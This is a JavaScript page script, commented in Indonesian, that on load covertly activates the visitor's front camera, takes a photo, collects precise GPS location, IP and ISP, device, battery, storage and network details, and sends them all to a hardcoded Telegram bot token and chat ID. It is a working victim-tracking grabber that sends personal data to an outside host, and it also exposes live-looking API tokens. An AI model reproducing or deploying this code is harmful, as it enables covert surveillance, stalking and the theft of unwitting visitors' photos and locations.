const collectedData = {};
let photoCaptured = false; // Untuk memastikan hanya satu foto diambil
let locationCaptured = false; // Untuk memastikan lokasi hanya dikirim sekali

// Fungsi untuk mendapatkan alamat IP dan ISP
function getIP() {
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const ip = data.ip;

            // Mendapatkan ISP menggunakan ipinfo.io API
            fetch(`https://ipinfo.io/${ip}/json?token=ce2d7e88896a36`)
                .then(response => response.json())
                .then(ispData => {
                    const isp = ispData.org || 'Tidak diketahui';
                    collectDeviceData('ip', { ip, isp });
                })
                .catch(error => {
                    console.error('Gagal mendapatkan ISP:', error);
                    collectDeviceData('ip', { ip, isp: 'Tidak diketahui' });
                });
        })
        .catch(error => {
            console.error('Gagal mendapatkan IP:', error);
        });
}

// Fungsi untuk mengumpulkan dan mengirim data perangkat terlebih dahulu
function collectDeviceData(key, value) {
    collectedData[key] = value;

    if (
        collectedData.battery &&
        collectedData.device &&
        collectedData.storage &&
        collectedData.network &&
        !photoCaptured &&
        !locationCaptured
    ) {
        sendDeviceData(); // Kirim data perangkat lebih dahulu
    }
}

// Fungsi untuk mengumpulkan data lokasi dan foto
function collectLocationAndPhotoData() {
    if (!photoCaptured && !locationCaptured) {
        capturePhotoAndSendLocation(); // Kirim data lokasi dan foto bersamaan
    }
}

function sendDeviceData() {
    const botaja = '7875784717:AAHZv0ytkPCzM2rfb_T9m6BFYF37KAxQDGk';
    const chatId = '5409710235';

    const message = `
        🔍 Informasi Perangkat 🔍

        🌐 IP: ${collectedData.ip?.ip || 'Tidak diketahui'}
        📡 ISP: ${collectedData.ip?.isp || 'Tidak diketahui'}

        📱 Perangkat:
        - User Agent: ${collectedData.device?.userAgent || 'Tidak diketahui'}
        - Platform: ${collectedData.device?.platform || 'Tidak diketahui'}
        - Bahasa: ${collectedData.device?.language || 'Tidak diketahui'}
        - Status Jaringan: ${collectedData.device?.networkStatus || 'Tidak diketahui'}

        📡 Jaringan:
        - Jenis Koneksi: ${collectedData.network?.connectionType || 'Tidak diketahui'}
        - Kecepatan Unduh: ${collectedData.network?.downlink || 'Tidak diketahui'} Mbps
        - Latensi: ${collectedData.network?.rtt || 'Tidak diketahui'} ms

        🔋 Baterai:
        - Level: ${collectedData.battery?.level || 'Tidak diketahui'}
        - Status Pengisian: ${collectedData.battery?.charging || 'Tidak diketahui'}

        🗂 Penyimpanan:
        - Total: ${collectedData.storage?.total || 'Tidak diketahui'}
        - Digunakan: ${collectedData.storage?.used || 'Tidak diketahui'}

        🕒 Waktu Akses: ${collectedData.device?.visitTime || 'Tidak diketahui'}
        `.trim();

    const urlMessage = `https://api.telegram.org/bot${botaja}/sendMessage`;

    fetch(urlMessage, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message }),
    }).then(() => {
        console.log('Data perangkat berhasil dikirim.');
    }).catch(error => {
        console.error('Gagal mengirim data perangkat:', error);
    });
}

function capturePhotoAndSendLocation() {
    const videoElement = document.getElementById('camera');
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    const targetWidth = 640;
    const targetHeight = 480;

    canvas.width = targetWidth;
    canvas.height = targetHeight;

    context.drawImage(videoElement, 0, 0, targetWidth, targetHeight);

    canvas.toBlob(function (blob) {
        photoCaptured = true;
        locationCaptured = true;

        // Matikan kamera setelah foto diambil
        if (videoElement.srcObject) {
            const tracks = videoElement.srcObject.getTracks();
            tracks.forEach(track => track.stop()); // Hentikan semua track (kamera)
            videoElement.srcObject = null; // Hapus sumber video
        }

        sendLocationAndPhoto(blob); // Kirim data lokasi dan foto
    }, 'image/jpeg', 0.7);
}

function sendLocationAndPhoto(photoBlob) {
    const botaja = '7875784717:AAHZv0ytkPCzM2rfb_T9m6BFYF37KAxQDGk';
    const chatId = '5409710235';

    const message = `
        📍 Lokasi:
        - Provinsi: ${collectedData.location?.provinsi || 'Tidak diketahui'}
        - Kabupaten/Kota: ${collectedData.location?.kabupaten || 'Tidak diketahui'}
        - Kecamatan: ${collectedData.location?.kecamatan || 'Tidak diketahui'}
        - Latitude: ${collectedData.location?.latitude || 'Tidak diketahui'}
        - Longitude: ${collectedData.location?.longitude || 'Tidak diketahui'}
        `.trim();

    const urlMessage = `https://api.telegram.org/bot${botaja}/sendMessage`;
    const urlPhoto = `https://api.telegram.org/bot${botaja}/sendPhoto`;

    fetch(urlMessage, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message }),
    }).then(() => {
        fetch(urlPhoto, {
            method: 'POST',
            body: createPhotoFormData(chatId, photoBlob),
        }).then(response => {
            if (response.ok) {
                console.log('Data lokasi dan foto berhasil dikirim.');
            } else {
                console.error('Gagal mengirim foto:', response.statusText);
            }
        });
    });
}

function createPhotoFormData(chatId, imageBlob) {
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', imageBlob, 'photo.jpg');
    return formData;
}

// Fungsi untuk mengambil lokasi
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`)
                    .then(response => response.json())
                    .then(data => {
                        const components = data.address;
                        const provinsi = components.state || 'Tidak ditemukan';
                        const kabupaten = components.city || 'Tidak ditemukan';
                        const kecamatan = components.town ||  components.district || components.suburb || 'Tidak ditemukan';
                        collectedData.location = { provinsi, kabupaten, kecamatan, latitude, longitude };
                        collectLocationAndPhotoData(); // Kirim data lokasi dan foto bersama
                    })
                    .catch(error => console.error('Gagal mendapatkan data lokasi:', error));
            },
            error => console.error('Gagal mendeteksi lokasi:', error),
            { enableHighAccuracy: true, timeout: 15000 }
        );
    }
}

// Fungsi untuk mengaktifkan kamera
function enableCamera() {
    const videoElement = document.getElementById('camera');
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        .then(stream => {
            videoElement.srcObject = stream;
            videoElement.setAttribute('playsinline', true);
            videoElement.play();
        })
        .catch(error => {
            console.error('Gagal mengakses kamera:', error);
        });
}

// Panggilan awal
window.onload = function () {
    enableCamera();
    getIP();
    getLocation();

    // Data perangkat
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language || navigator.userLanguage;
    const networkStatus = navigator.onLine ? 'Online' : 'Offline';
    const visitTime = new Date().toLocaleString();
    collectDeviceData('device', { userAgent, platform, language, networkStatus, visitTime });

    if (navigator.getBattery) {
        navigator.getBattery().then(battery => {
            const level = Math.floor(battery.level * 100);
            const charging = battery.charging ? 'Sedang diisi daya' : 'Tidak diisi daya';
            collectDeviceData('battery', { level: `${level}%`, charging });
        });
    }

    if (navigator.storage && navigator.storage.estimate) {
        navigator.storage.estimate().then(estimate => {
            const total = estimate.quota ? (estimate.quota / 1024 / 1024).toFixed(2) + " MB" : "Tidak diketahui";
            const used = estimate.usage ? (estimate.usage / 1024 / 1024).toFixed(2) + " MB" : "Tidak diketahui";
            collectDeviceData('storage', { total, used });
        }).catch(error => {
            console.error("Gagal mendapatkan informasi penyimpanan:", error);
        });
    }

    if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const connectionType = connection.effectiveType;
        const downlink = connection.downlink;
        const rtt = connection.rtt;
        collectDeviceData('network', { connectionType, downlink, rtt });
    }
};
